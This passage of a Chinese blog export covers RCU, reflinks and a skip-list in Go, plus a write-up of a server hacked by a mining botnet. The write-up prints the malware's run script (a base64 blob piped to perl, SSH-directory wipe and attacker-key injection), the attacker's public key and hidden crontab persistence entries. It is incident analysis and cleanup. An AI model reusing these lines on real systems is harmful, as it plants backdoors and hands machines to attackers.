class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unregister_nmi_handler</span><span class="params">(<span class="type">handler_t</span> cb)</span></span><br><span class="line">&#123;</span><br><span class="line">  spin_lock(&amp;nmi_list_lock);</span><br><span class="line">  rcu_list_remove(cb);</span><br><span class="line">  spin_unlock(&amp;nmi_list_lock);</span><br><span class="line">  synchronize_rcu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RCU在用户态用的比较少，远不如mutex和spinlock普遍。<br>当然，用户态一般不怎么用这个东西，像数据库那种（用redis上内存用cache硬抗.jpg）</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>reader很简单，就是<code>rcu_read_lock</code>和<code>rcu_read_unlock</code>。<code>rcu_read_lock</code>和<code>rcu_read_unlock</code>中间的这一段通常叫读侧临界区 (read-side critical sections)</p>
<p>writer的要复杂一点</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>rcu的实现有很多，比如实时性比较好的srcu（sleepable rcu）、嵌入式用的比较多的tinyrcu、用于CPU核数非常多的tree-rcu；这里只说一下简单经典的rcu实现，其他具体的实现可以去看Paul的文章。<br>这里大部分都是从lwn那里抄来的，建议英文好的直接看原文：<br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzI2MzEzMC8=">What is RCU? Part 2: Usage<i class="fa fa-external-link-alt"></i></span></p>
<p>如果想看详细实现可以去看linux rcu主要作者Paul的文章和书：<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmVkZ2Uua2VybmVsLm9yZy9wdWIvbGludXgva2VybmVsL3Blb3BsZS9wYXVsbWNrL3BlcmZib29rL3BlcmZib29rLmh0bWw=">Is Parallel Programming Hard, And, If So, What Can You Do About It?<i class="fa fa-external-link-alt"></i></span></p>
<p><strong>Linux对于指针的load和store都是原子的</strong>，所以在链表读取的时候，指针要么指向新插入完成的，要么指向旧的还没被删的链表，不会出现正在修改链表的时候刚删除指针还没来得及插入产生<code>segmentation fault</code>。</p>
<p>以链表为例，写入（Write）的时候先复制（copy）一个副本，然后在读取（read）较少的合适时间执行插入操作。当然，我们可以等到完全没有写入的间隙。但是读取（reader）很多一直没用空闲，写入会非常慢；一直都有reader的极端情况会导致一直无法写入。rcu用宽限期（grace period）巧妙的解决了这个问题。</p>
<h3 id="怎么知道copy之前的读取全部完成可以reclaim了"><a href="#怎么知道copy之前的读取全部完成可以reclaim了" class="headerlink" title="怎么知道copy之前的读取全部完成可以reclaim了"></a>怎么知道copy之前的读取全部完成可以reclaim了</h3><p>我看rcu之前的第一反应是引用计数，当引用计数降到0就说明copy的副本可以reclaim了。但是引用计数效率太低了，而且多核的时候引用计数更麻烦了。</p>
<p>经典的rcu模型是不允许抢占的。当读取完成进入临界区，我们认为这个CPU进入一次<strong>静止状态（quiescent state）</strong>，以下简称QS。linux里面用cpumask来记录这个状态，我们就简单的当成是用一个bitmap来保存每个cpu的状态好了。显然，从bitmap得知copy之后每个CPU都经历过一次QS后，那在copy之前的读操作都已经完成了，这个时候就可以reclaim了。</p>
<h3 id="多个writer怎么处理"><a href="#多个writer怎么处理" class="headerlink" title="多个writer怎么处理"></a>多个writer怎么处理</h3><p>如果有多个writer，那通常会给不同的writer加spin_lock来处理</p>
<h3 id="无锁"><a href="#无锁" class="headerlink" title="无锁"></a>无锁</h3><p>无锁是对于读来说的，写入的时候锁比较多。在修改bitmap的时候是需要加锁的（一般是spin_lock）。太多的写入同时对bitmap加锁效率很低，于是就有了tree-rcu。tree-rcu是将不同的CPU状态分组加锁，然后树状结构向上汇总状态。</p>
<p><img src="/rcu-and-userspace-rcu/2022-01-08-22-35-28.png"></p>
<p>如果你的逻辑CPU数量（就是你在htop里看到的，比如6核12线程的5600x是12）小于16，那它会退化成单个rcu_node。<br>tree-rcu详见[A Tour Through TREE-RCU’s DataStructures]</p>
<p>多个writer的情况下也要加锁，一般是spin_lock锁。</p>
<h2 id="用户态"><a href="#用户态" class="headerlink" title="用户态"></a>用户态</h2><p>rcu的实现依赖了很多内核态的东西，移植到用户态比较困难。比较出名的一个用户态rcu是<code>liburcu</code></p>
<p>模仿rcu的思想可以实现一点读多写少的优化，比如<code>sonic</code>的map<br><span class="exturl" data-url="aHR0cHM6Ly9oYW5zaGFuZ2xpbi5zcGFjZS90ZWNoL3JjdS8=">如何实现一个超快读的map<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvUkNVL3doYXRpc1JDVS5odG1s">What is RCU? – “Read, Copy, Update”<i class="fa fa-external-link-alt"></i></span> Linux Kernel文档的介绍<br><span class="exturl" data-url="aHR0cHM6Ly9wZG9zLmNzYWlsLm1pdC5lZHUvNi44MjgvMjAxOC9yZWFkaW5ncy9yY3UtZGVjYWRlLWxhdGVyLnBkZg==">RCU Usage In the Linux Kernel: One Decade Later<i class="fa fa-external-link-alt"></i></span> MIT 6.828课 RCU的阅读材料，我就是在这个课上看到rcu的，看起来还挺有意思<br><span class="exturl" data-url="aHR0cDovL3d3dy5yZHJvcC5jb20vdXNlcnMvcGF1bG1jay9SQ1Uv">Introduction to RCU<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmVkZ2Uua2VybmVsLm9yZy9wdWIvbGludXgva2VybmVsL3Blb3BsZS9wYXVsbWNrL3BlcmZib29rL3BlcmZib29rLmh0bWw=">Is Parallel Programming Hard, And, If So, What Can You Do About It?<i class="fa fa-external-link-alt"></i></span> 我对于rcu的不少疑惑是看了这个才懂，推荐（本书主要作者Paul也是linux rcu的主要实现者）<br><span class="exturl" data-url="aHR0cDovL2lmZXZlLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMjAxMy8wNS8lRTYlQjclQjElRTUlODUlQTUlRTclOTAlODYlRTglQTclQTMlRTUlQjklQjYlRTglQTElOEMlRTclQkMlOTYlRTclQTglOEJWMS4wLnBkZg==">深入理解并行编程<i class="fa fa-external-link-alt"></i></span> 上面那本书的中文翻译<br>谢宝友 深入理解RCU系列文章<br><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzQ5MDIyODI=">Linux锁机制：可抢占RCU原理<i class="fa fa-external-link-alt"></i></span><br>[CPU masks - linux-insiders] linux-insiders的CPU masks介绍（这本书也挺不错的，我好几次查资料翻到，讲的比较易懂）<br><span class="exturl" data-url="aHR0cHM6Ly94aW5xaXUuZ2l0Ym9va3MuaW8vbGludXgtaW5zaWRlcy1jbi9jb250ZW50L0NvbmNlcHRzL2xpbnV4LWNwdS0yLmh0bWw=">CPU masks 介绍<i class="fa fa-external-link-alt"></i></span> 中文翻译  </p>
]]></content>
      <categories>
        <category>Concurrency&amp;Go</category>
      </categories>
      <tags>
        <tag>rcu</tag>
      </tags>
  </entry>
  <entry>
    <title>重启博客</title>
    <url>/1a9a/</url>
    <content><![CDATA[<p>新博客又开通了(搬家)，不定期更新</p>
<span id="more"></span>

<p>原域名到期，加上之前的Wordpress网站不太喜欢，索性换到Hexo了，主题域名什么的都全换了。没换Hugo是因为没发现和Next一样这么喜欢的主题，这主题让我感到这个页面的却就是一个博客应该有的样子。</p>
<p>倒不是说这个主题多好看，它是我印象里博客的样子，让我找回了还是个小朋友的时候第一次注册博客的感觉。对呀，博客就长这个样子。左边是导航栏，下面一小栏放头像和放点徽章挂件；中间是文章，文章最下面是评论。再随便加个背景，简直完美。咿，空荡荡的好像还少点什么；是弹窗小广告，这个就算了…..</p>
<p>最早的时候沉迷三维弹球和扫雷，以及桌面屏保。后来开始上网，已经错过了聊天室的时代，也错过了拨号上网和Telnet论坛的时代，论坛已经流行用Discuz了，QQ号已经8位了。跟风注册了雅虎伊妹儿和搜狐博客，以及一些论坛帐号，开始了网上冲浪。后来换到Wordpress了，加上一个穷学生手头零花钱也不多，中间关了两次没有续上。</p>
<p>偶当年还是一只小网虫的时候，并不是特别喜欢发博客，喜欢泡在BBS里，写的东西也都喜欢放在BBS里水帖。论坛里看的人比较多，偶尔斑竹还会出来给加个精。大概从15年开始BBS一个个都亡了。有的因为用户大量出走宣布死亡，有的像贴吧一样开始杀鸡取卵式变现挣钱，还有的因为政策原因关了。有的多次改版丢了好多老帖子，有的格式也乱了，老用户抱怨出走。有的一直停留在远古版本的Discuz，然后有一天站被黑了….</p>
<p>看多了Flarum的新论坛现在偶尔点进一些没见过的Discuz论坛还是会瞬间恍惚，仿佛又回到了当年</p>
<p>有的是还没亡却从当年的人声鼎沸变得门可罗雀，不时传来哪个一年到头也没几个人说话的论坛站长支撑不下去又要关站了的消息。认识的好多网友也有逐渐沉寂，失去了联系。</p>
<p>之前博客里的东西不适合放出来，就默默存在硬盘里了。在论坛里写的东西就放在论坛里和BBS一起消亡吧。</p>
<blockquote class="blockquote-center">
<p>山中友，试高吟楚些，重与招魂</p>

</blockquote>

<p><img src="/%E5%8D%9A%E5%AE%A2%E5%BC%80%E9%80%9A/cyperpunk.png" alt="Welcome"></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>文件系统的Reflink</title>
    <url>/reflink-hardlink-symlink/</url>
    <content><![CDATA[<p>reflink暂且翻译成引用链接吧，新版coreutils的cp和mv的默认行为就是reflink（如果文件系统支持）。硬链接和软链接的</p>
<span id="more"></span>

<h2 id="Reflink"><a href="#Reflink" class="headerlink" title="Reflink"></a>Reflink</h2><p>如果你的coreutils&gt;9.0，而且装的是Btrfs或XFS等支持Reflink的文件系统，那么<code>cp</code>和<code>mv</code>的默认行为是使用reflink(mv应该是在不同子卷之间，when moving files across BTRFS subvols)，<code>cp --reflink=auto</code></p>
<p>最早是从Btrfs听说的reflink,以为这就是一个COW，后来发现它并不一定需要COW，而是和de-duplication（重复数据删除）有关。</p>
<h2 id="整理碎片对reflink的影响"><a href="#整理碎片对reflink的影响" class="headerlink" title="整理碎片对reflink的影响"></a>整理碎片对reflink的影响</h2><p>以Btrfs为例，defragment会打断reflink，于是你做完defrag以后会发现占用空间可能大了好多。不过像Btrfs之类的文件系统几乎都跑在SSD上，整理碎片不仅不会像机械那样提升性能，而且会增加写入。所以直接不整理碎片就好了。</p>
<h2 id="硬链接和软链接和Reflink的区别"><a href="#硬链接和软链接和Reflink的区别" class="headerlink" title="硬链接和软链接和Reflink的区别"></a>硬链接和软链接和Reflink的区别</h2><p>这两个东西的区别基本上网上都说烂了。这里再简单说一下。</p>
<p>硬链接（hardlink）的inode号和原来的一样</p>
<p>但是hardlink和symlink有一些问题，创建的时候很开心，修改和删除就比较麻烦。</p>
<h2 id="Reflink这个东西有啥用"><a href="#Reflink这个东西有啥用" class="headerlink" title="Reflink这个东西有啥用"></a>Reflink这个东西有啥用</h2><p>1.加快复制和移动速度<br>2.节省空间</p>
<p>比如wine的reflink补丁。比如你steam开proton下了很多游戏，你会发现<code>.local/share/Steam</code>下面每个游戏的目录都有一堆相同的ddl。reflink的补丁可以有效减小Wine应用的体积，很多重复的ddl文件都会以reflink的方式复制。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhvcm9uaXguY29tL3NjYW4ucGhwP3BhZ2U9bmV3c19pdGVtJnB4PVJlZmxpbmstRm9yLVdpbmUtUGF0Y2hlcw==">Proposed Reflink Support Would Provide Big Space Savings For Wine<i class="fa fa-external-link-alt"></i></span>， <span class="exturl" data-url="aHR0cHM6Ly93d3cucGhvcm9uaXguY29tL3NjYW4ucGhwP3BhZ2U9bmV3c19pdGVtJnB4PVdpbmUtUmVmbGluay1SZXZpc2Vk">Wine Reflink Support Continues To Be Worked On For Significant Space Savings<i class="fa fa-external-link-alt"></i></span>  </p>
<p>坏消息这玩意暂时不支持ext4，好消息Steam Deck将采用Btrfs。对于不支持的文件系统，可以通过OVerlayfs实现，不过好像没多少人这么干（Overlayfs这个名字你也在Docker那里听说过对罢？坑也不少）</p>
<p>那wine为什么不用符号链接呢？看起来这种情况下用symlink不是也挺合适的？</p>
<blockquote>
<p>Because most of the file WINE is running didn’t have symlink support in mind.They assumes that the open give them the file, not a symlink.After opening the file, they would just update it without replacing that symlink with an actual file.</p>
</blockquote>
<p>另一个麻烦的问题是相当多的游戏反作弊软件，他们在检查的时候不认符号链接。于是就认为你这ddl有问题，然后就封号了。用reflink就比较好解决了，在Wine应用和你看来是感觉不到链接存在的，reflink看起来就像是正常的文件一样；而symlink看起来就是一个link，如果Wine应用和外挂检测不去处理他会出问题。举一个不恰当的例子，reflink就像透明代理一样，用户和软件感觉不到它的存在。</p>
<p>要不我们叫它透明链接算了（逃</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5vcmFjbGUuY29tL2xpbnV4L3Bvc3QveGZzLWRhdGEtYmxvY2stc2hhcmluZy1yZWZsaW5r">https://blogs.oracle.com/linux/post/xfs-data-block-sharing-reflink<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9idHJmcy53aWtpLmtlcm5lbC5vcmcvaW5kZXgucGhwL0RlZHVwbGljYXRpb24=">Deduplication Btrfs Wiki<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3J1Y2lhbC5jb20vYXJ0aWNsZXMvYWJvdXQtc3NkL3Nob3VsZC15b3UtZGVmcmFnLWFuLXNzZA==">Should You Defrag an SSD? <i class="fa fa-external-link-alt"></i></span> </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9pb2N0bF9maWNsb25lLjIuaHRtbA==">https://man7.org/linux/man-pages/man2/ioctl_ficlone.2.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzMzMTgwOC8=">https://lwn.net/Articles/331808/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>fs</tag>
        <tag>reflink</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次服务器被黑植入挖矿脚本</title>
    <url>/d6da/</url>
    <content><![CDATA[<p>不是吧，配置这么烂的服务器都要搞我？</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CPU  [||||||||||||||||                 51.8%]   CPU -    51.8%  nice:     0.0%  ctx_sw:    8K   MEM -   21.7%  active:    5.31G   SWAP -    0.0%   LOAD    20-core</span><br><span class="line">MEM  [|||||||                          21.7%]   user:    51.3%  irq:      0.0%  inter:   5508   total:  31.3G  inactive:  4.27G   total:    976M  </span><br><span class="line">····</span><br><span class="line">lo                         0b     0b   999.5  0.0   2.34G 2.44M   2654 root        67h8:58 16    0 S    ? ?    ./cron</span><br><span class="line">2020-01-15 16:17:54 CST</span><br></pre></td></tr></table></figure>

<p>症状：昨天（2020.1.14）root上不去了，rsa密钥也挂了，以为是网的问题，今天一试还不行。用自己的另一个账号登了一下，发现<code>su root</code>居然permission denied了。怀疑是被黑了，一看系统占用，有挖矿程序在跑，而且网络带宽占用也很高，怀疑是被当成肉鸡对外攻击了。看了一下系统日志，是一月13号被黑的，照着网上清了一遍。从此禁用密码登录（之前就想禁，师兄嫌麻烦）。MySQL也禁用密码改ssl</p>
<p>clamav再扫一遍</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> clamscan -r /root 2 &gt;&gt; err.out &amp;</span><br></pre></td></tr></table></figure>

<p>更新：</p>
<p>之前没清干净，貌似又被黑了</p>
<p>症状，运行<code>apt update</code>的时候</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Errors were encountered while processing:</span><br><span class="line"> clamav-freshclam</span><br><span class="line"> clamav</span><br><span class="line">E: Sub-process /usr/bin/dpkg returned an error code (1)</span><br></pre></td></tr></table></figure>

<p>然而运行了一下freshclam</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@xi102:~<span class="comment"># freshclam</span></span><br><span class="line">Sat Mar  7 16:49:25 2020 -&gt; ClamAV update process started at Sat Mar  7 16:49:25 2020</span><br><span class="line">Sat Mar  7 16:49:25 2020 -&gt; daily.cld database is up to <span class="built_in">date</span> (version: 25743, sigs: 2209759, f-level: 63, builder: raynman)</span><br><span class="line">Sat Mar  7 16:49:25 2020 -&gt; main.cvd database is up to <span class="built_in">date</span> (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)</span><br><span class="line">Sat Mar  7 16:49:25 2020 -&gt; bytecode.cvd database is up to <span class="built_in">date</span> (version: 331, sigs: 94, f-level: 63, builder: anvilleg)</span><br></pre></td></tr></table></figure>

<p>居然显示病毒库是最新的</p>
<p>可疑进程<br>&#x2F;opt&#x2F;atlassian&#x2F;confluence&#x2F;jre&#x2F;&#x2F;bin&#x2F;java -Djava.ut</p>
<p>然后看了一下有没有可疑的定时任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xi102:~# crontab -l</span><br><span class="line">0 0 */3 * * /root/.bashtemp/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /root/.bashtemp/a/upd&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">5 8 * * 0 /root/.bashtemp/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">@reboot /root/.bashtemp/b/sync&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">0 0 */3 * * /tmp/.X19-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>那个tmp下面有的时候是<code>0 0 */3 * * /tmp/.X21-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</code></p>
<p>这个<code>.X某某-unix</code>应该是想伪装成<code>.X11-unix</code>X11转发的临时文件</p>
<p>root@xi102:~&#x2F;.bashtemp# ps aux | grep cron<br>root     140526  0.0  0.0  12944  1028 pts&#x2F;1    S+   17:16   0:00 grep –color&#x3D;auto cron</p>
<p>看了一下这个目录下面，有鬼，应该就是它了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xi102:~/.bashtemp# ls</span><br><span class="line">a  b  cron.d  dir2.dir</span><br></pre></td></tr></table></figure>

<p>谷歌随手一搜这个.bashtemp，全都是被挖矿的被黑的，先干掉再说<br><span class="exturl" data-url="aHR0cDovL2Jsb2cuaXRwdWIubmV0LzMxNTU5NzU4L3ZpZXdzcGFjZS0yNjY3ODAxLw==">http://blog.itpub.net/31559758/viewspace-2667801/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk3NjYy">https://www.anquanke.com/post/id/197662<i class="fa fa-external-link-alt"></i></span><br>更新，又看到几个的 <span class="exturl" data-url="aHR0cDovL20ubGFuaHVzb2Z0LmNvbS9BcnRpY2xlLzc0NS5odG1s">http://m.lanhusoft.com/Article/745.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly95dWxpamlhLm5ldC9jbi8lRTYlOTMlOEQlRTQlQkQlOUMlRTclQjMlQkIlRTclQkIlOUYvMjAyMC8wMy8wMy9Ucm9qYW4tYXR0YWNrLWFuYWx5c2lzLmh0bWwjZm46Mg==">https://yulijia.net/cn/操作系统/2020/03/03/Trojan-attack-analysis.html#fn:2<i class="fa fa-external-link-alt"></i></span><br>把这个文件夹拉下来，可以看到里面有个run文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">nohup</span> ./stop&gt;&gt;/dev/null &amp;</span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ZXZhbCB1bnBh....这里太长略过...&quot;</span> | <span class="built_in">base64</span> --decode | perl</span><br><span class="line"><span class="built_in">cd</span> ~ &amp;&amp; <span class="built_in">rm</span> -rf .ssh &amp;&amp; <span class="built_in">mkdir</span> .ssh &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3N...</span></span><br><span class="line"><span class="string">这里一段密钥太长略过...fckr&quot;</span>&gt;&gt;.ssh/authorized_keys &amp;&amp; <span class="built_in">chmod</span> -R go= ~/.ssh</span><br></pre></td></tr></table></figure>

<p>这里的rsa密钥和那一串base64编码的perl脚本太长，单独放出来</p>
<p>rsa：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr</span><br></pre></td></tr></table></figure>

<p>perl脚本（base64解码之后）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval unpack u=&gt;q&#123;_&quot;FUY(...中间这一段还是太长略过...&#125;</span><br></pre></td></tr></table></figure>

<p>使用perl的unpack把后面那一段解包之后还是有900多行，太长了，放到Github gist上了[^4]<br>(按照挖矿佬的风俗是不是应该放到pastebin上？)</p>
<p>我上面放的那两篇文章里的情况和这个几乎一样。大概就是先运行一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRyZW5kbWljcm8uY29tL3RyZW5kbGFicy1zZWN1cml0eS1pbnRlbGxpZ2VuY2Uvb3V0bGF3LWhhY2tpbmctZ3JvdXBzLWJvdG5ldC1vYnNlcnZlZC1zcHJlYWRpbmctbWluZXItcGVybC1iYXNlZC1iYWNrZG9vci8=">perl的脚本<i class="fa fa-external-link-alt"></i></span>，然后把你的SSH密钥删了，插入它的后门密钥。进程伪装成rsync之类的东西。运行后会在<code>\tmp\</code>下面产生一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5qdW5pcGVyLm5ldC9lbi11cy90aHJlYXQtcmVzZWFyY2gvZG90YTMtaXMteW91ci1pbnRlcm5ldC1vZi10aGluZ3MtZGV2aWNlLW1vb25saWdodGluZw==">dota3文件<i class="fa fa-external-link-alt"></i></span></p>
<p>看到了一个可疑的欧洲IP：45.9.148.125<br>和一个可疑的网站：<span class="exturl" data-url="aHR0cDovL3d3dy5taW5wb3AuY29tLw==">www.minpop.com<i class="fa fa-external-link-alt"></i></span></p>
<p>干掉定时任务<code>crontab -e</code>,把上面那几条定时任务全删了<br>删除<code>~/.ssh</code>目录底下可疑的authorized_keys<br>删除定时任务中的可疑文件夹<code>.bashtemp</code>和<code>.X21-unix</code></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>沙河夜雨</title>
    <url>/f641/</url>
    <content><![CDATA[<p>这几天走过泥电沙河边上的建设路，夜间车马喧嚣，仿佛回到了在一中上学的日子。</p>
<span id="more"></span>

<p>晚上路过建设路，卖小吃的沿街店铺生意很火爆，排队的人很长，到底还是网红街，比清水河西门外一片濒临倒闭的冷清店铺红火多了。然而我这几天却没看到多少麻雀在路边找吃的，可能是人实在太多不太敢来吧。沙河校内倒是有些珠颈斑鸠和白颊噪鹛在路边捡樟树果子吃。老鼠行色匆匆，穿梭在摊位间，不喜欢辣的我路过建设路，没有胃口，每次大晚上的走过去居然一点也不饿。</p>
<p>今天实习回来的师姐请我们吃螺蛳粉，不习惯嗦粉并不知道哪里好吃。<br>听说建设路吃的自从炒作过度就不如以前了，我也不晓得，反正没有市井气息，像旅游区。</p>
<p>晚上回到租的房子，老旧的校区</p>
<p>成都夜雨，点点滴滴到天明</p>
<p><em><strong>对了，泥电的镜像源要上了，不来试试吗</strong></em><br><span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24v">电子科技大学开源镜像站<i class="fa fa-external-link-alt"></i></span>    ~~202.115.22.207 ~~（需要校内IP）<br>电子科大镜像源自从凝聚的凉了以后终于要续上了</p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>写一个跳表</title>
    <url>/skiplist/</url>
    <content><![CDATA[<p>写起来确实比树家族简单太多了，树家族的并发我不太会整。为什么要费劲左旋右旋去平衡呢，跳表靠概率分布多么简单优雅啊</p>
<span id="more"></span>

<h2 id="关于跳表"><a href="#关于跳表" class="headerlink" title="关于跳表"></a>关于跳表</h2><p>跳表上个世纪的论文里面就有了，不过有业界大量使用貌似比较晚， 貌似是leveldb开始的，后来redis等很多数据库都上了跳表。</p>
<p>跳表在单链表上面加了一层一层的稀疏节点，于是查找的复杂度就降到了$O(\log_2n)$, 类似二分查找，从稀疏节点向下逐级找就行了。如果每一层的节点数量都是下一层的$\frac{1}{2}$</p>
<p><img src="/skiplist/1653038576.png"></p>
<p>跳表我很喜欢的一个地方是这个玩意不需要像树家族那样去靠左旋右旋来平衡，于是实现就特别简单。</p>
<p>跳表这个结构对缓存不是很友好（链表在内存里面不连续）但是实现很简单，而且加锁比较容易做到加锁力度小。</p>
<p>MuQSS调度器用的就是跳表， 取代了原来BFS调度器里面runqueue的链表，然后查找runqueue的插入复杂度变成了$O(logN)$，然后由于skiplist是有序的，每次只要取出头节点就可以了（优先级最高的），对于MuQSS查找task的复杂度是$O(1)$</p>
<p>MuQSS加锁的时候就直接对每个CPU的skiplist加了一把大锁（task不是很多，加小锁没必要）</p>
<p>这里多说一下BFS调度器的遍历$O(N)$复杂度，这个其实并不慢的，在绝大多数没有跑很多东西的桌面用户，可能链表里面就只有十几个task，遍历起来并不一定比$O(logN)$或者$O(1)$的调度器慢</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>leetcode上就有一道设计跳表的题，直接做呗 <span class="exturl" data-url="aHR0cHM6Ly9sZWV0Y29kZS5jb20vcHJvYmxlbXMvZGVzaWduLXNraXBsaXN0Lw==">design skiplist<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">  <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  skl := Constructor()</span><br><span class="line">  skl.Add(<span class="number">1</span>)</span><br><span class="line">  skl.Add(<span class="number">2</span>)</span><br><span class="line">  skl.Add(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">  fmt.Println(skl.Search(<span class="number">0</span>)) <span class="comment">// false</span></span><br><span class="line">  skl.Add(<span class="number">4</span>)</span><br><span class="line">  fmt.Println(skl.Search(<span class="number">1</span>)) <span class="comment">// true</span></span><br><span class="line">  skl.Add(<span class="number">5</span>)</span><br><span class="line">  skl.Erase(<span class="number">0</span>)</span><br><span class="line">  skl.Erase(<span class="number">1</span>)</span><br><span class="line">  fmt.Println(skl.Search(<span class="number">1</span>)) <span class="comment">// true</span></span><br><span class="line">  <span class="comment">// fmt.Println(skl.Search(6)) // false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @lc code=start</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> MAX_LEVEL <span class="type">int</span> = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Skiplist <span class="keyword">struct</span> &#123;</span><br><span class="line">  currentLevel <span class="type">int</span></span><br><span class="line">  root         *Node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Node <span class="keyword">struct</span> &#123;</span><br><span class="line">  Val  <span class="type">int</span></span><br><span class="line">  Prev []*Node</span><br><span class="line">  Next []*Node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">  rand.Seed(time.Now().UnixNano())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randomLevel</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">  level := <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> rand.Intn(<span class="number">2</span>) == <span class="number">1</span> &#123;</span><br><span class="line">    level++</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> level &gt; MAX_LEVEL &#123;</span><br><span class="line">    level = MAX_LEVEL</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> level</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">()</span></span> Skiplist &#123;</span><br><span class="line">  <span class="keyword">var</span> skiplist Skiplist</span><br><span class="line">  <span class="keyword">var</span> node Node</span><br><span class="line">  skiplist.root = &amp;node</span><br><span class="line">  skiplist.currentLevel = <span 